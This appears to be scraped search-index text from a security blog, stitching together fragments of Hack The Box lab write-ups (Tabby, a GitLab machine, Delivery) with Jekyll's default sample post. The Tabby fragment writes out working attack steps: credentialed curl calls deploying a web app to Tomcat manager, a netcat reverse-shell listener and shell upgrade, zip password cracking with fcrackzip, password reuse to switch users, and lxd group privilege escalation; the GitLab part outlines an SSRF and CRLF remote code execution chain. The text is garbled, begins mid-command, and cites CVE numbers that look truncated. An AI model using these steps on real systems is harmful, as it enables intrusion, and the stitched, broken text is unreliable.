'http://10.10.10.194:8080/manager/text/deploy?path=/maoutis' OK - Deployed application at context path [/maoutis] root@kali:~/HackTheBox/Machine/Tabby/files# curl -u 'tomcat':'$3cureP4s5w0rd123!' http://10.10.10.194:8080/manager/text/list OK - Listed applications for virtual host [localhost] /:running:0:ROOT /maoutis:running:0:maoutis /examples:running:0:/usr/share/tomcat9-examples/examples /host-manager:running:1:/usr/share/tomcat9-admin/host-manager /manager:running:0:/usr/share/tomcat9-admin/manager /docs:running:0:/usr/share/tomcat9-docs/docs and run it to get access as *tomcat* user. root@kali:~/HackTheBox/Machine/Tabby/files# curl -u 'tomcat':'$3cureP4s5w0rd123!' http://10.10.10.194:8080/maoutis/ . root@kali:~# nc -lvp 9876 python3 -c 'import pty; pty.spawn(\"/bin/bash\")' tomcat@tabby:/var/lib/tomcat9$ export TERM=screen CTRL+Z root@kali:~/HackTheBox# stty raw -echo root@kali:~/HackTheBox# fg tomcat@tabby:/var/lib/tomcat9$ . Lateral Movement to ash . Once gained the shell, further enumeration reveals that the user of the box is ash. Running LinEnum.sh we discovered a .zip backup file inside /var/www/html/files/ which require to be cracked in order to be unzipped. Let’s use fcrackzip in order to crack the archive. root@kali:~/HackTheBox/Machine/Tabby/files# fcrackzip -u -D -p '/usr/share/wordlists/rockyou.txt' 16162020_backup.zip PASSWORD FOUND!!!!: pw == admin@it . Password found! While inside the archive we didn’t find anything useful, trying to use the password to switch to ash reveals that the same password has been reused. tomcat@tabby:/var/www/html/files$ su ash Password: admin@it ash@tabby:/var/www/html/files$ uid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd) . Well done! We are ash! . Privilege Escalation . Running again LinEnum.sh it reveals that we are members of the lxd group and that exists a way to abuse this permission in order to became root. Searching on Google I found this article, which describes how an account on the system that is a member of the lxd group is able to escalate the root privilege by exploiting the features of LXD. First, download the lxd-alpine-builder locally on the kali machine and built it as root . $git clone https://github.com/saghul/lxd-alpine-builder.git $cd lxd-alpine-builder $sudo bash build-alpine . Probably will appear errors like “tar: Ignoring unknow … “. Don’t worry and continue     with the privilege escalation process. Then upload the .tar file on the ash home directory and import it inside lxc . Once finished, we will be root! . Trophy .

Nmap revealed a GitLab installation on port 5080 and a OpenSSH service on port 22. A custom account was registered in order to access the GitLab instance: . After get logged in, GitLab Version was enumerated from the “help” page: . Foothold . Googling around was found that GitLab Community Edition 11.4.7 suffered a Remote Code Execution vulnerability caused by a Server Side Request Forgery (CVE-2018-1957) and a CRFL Injection (CVE-2018-195). Among the various PoCs, the analysis conducted by liveoverflow was definitely one of the best choice to follow to be able to penetrate this machine. To summarize the vulnerability, arbitrary code execution can be achieved importing a new git project from the redis localhost port abusing a SSRF vulnerability in conjunction with the CRLF injection. This combination of vulnerabilities allowed to execute arbitrary code inside redis and so obtain a reverse shell. First, a test project was created and the corresponding import request was intercepted using burpsuite: .

Introduction . Delivery is an easy difficulty Linux machine based on web sites enumeration and putting the pieces together in order to abuse a “by-design” function and get access to a restricted area where a password is disclosed. Once obtained a low-privileged access to the target it was possible to leak mysql credentials and database contents, obtaining a list of users and relative hashes. Cracking those hashes it was possible to obtain the root password. Because it reused the same credential also for the machine, reusing the same credentials provided a high privileged access to the target.

    "content": "You’ll find this post in your _posts directory. Go ahead and edit it and re-build the site to see your changes. You can rebuild the site in many different ways, but the most common way is to run jekyll serve, which launches a web server and auto-regenerates your site when a file is updated. Jekyll requires blog post files to be named according to the following format: . YEAR-MONTH-DAY-title.MARKUP . Where YEAR is a four-digit number, MONTH and DAY are both two-digit numbers, and MARKUP is the file extension representing the format used in the file. After that, include the necessary front matter. Take a look at the source for this post to get an idea about how it works. Jekyll also offers powerful support for code snippets: . def print_hi(name) puts \"Hi, #{name}\" end print_hi('Tom') #=&gt; prints 'Hi, Tom' to STDOUT. Check out the Jekyll docs for more info on how to get the most out of Jekyll. File all bugs/feature requests at Jekyll’s GitHub repo. If you have questions, you can ask them on Jekyll Talk. ",
